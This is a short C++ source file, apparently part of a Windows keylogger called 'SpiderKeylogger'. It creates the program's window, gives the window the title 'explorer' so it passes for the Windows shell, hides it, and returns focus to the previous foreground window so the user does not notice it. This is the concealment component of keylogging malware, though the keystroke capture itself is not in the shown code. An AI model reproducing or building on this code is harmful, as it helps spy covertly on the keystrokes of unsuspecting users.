#include <ClientWindow.h>

ClientWindow::ClientWindow() : _inited(false)
{
}

ClientWindow::~ClientWindow()
{
}

static LRESULT	CALLBACK winProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	return (DefWindowProc(hwnd, msg, wp, lp));
}

bool ClientWindow::init(HINSTANCE instance)
{
	HWND			foregroundWindow = GetForegroundWindow();

	this->_winClass.hInstance = instance;
	this->_winClass.lpszClassName = "SpiderKeylogger";
	this->_winClass.lpfnWndProc = winProc;
	this->_winClass.style = CS_DBLCLKS;
	this->_winClass.cbSize = sizeof(WNDCLASSEX);
	this->_winClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	this->_winClass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	this->_winClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	this->_winClass.lpszMenuName = NULL;
	this->_winClass.cbClsExtra = 0;
	this->_winClass.cbWndExtra = 0;
	this->_winClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;
	if (!(RegisterClassEx(&this->_winClass)))
		return (false);
	this->_hwnd = CreateWindowEx(NULL, "SpiderKeyLogger", "explorer", WS_OVERLAPPEDWINDOW,
								CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL, 
								instance, NULL);
	if (!this->_hwnd)
		return (false);
	ShowWindow(this->_hwnd, SW_HIDE);
	UpdateWindow(this->_hwnd);
	SetForegroundWindow(foregroundWindow);
	this->_inited = true;
	return (true);
}
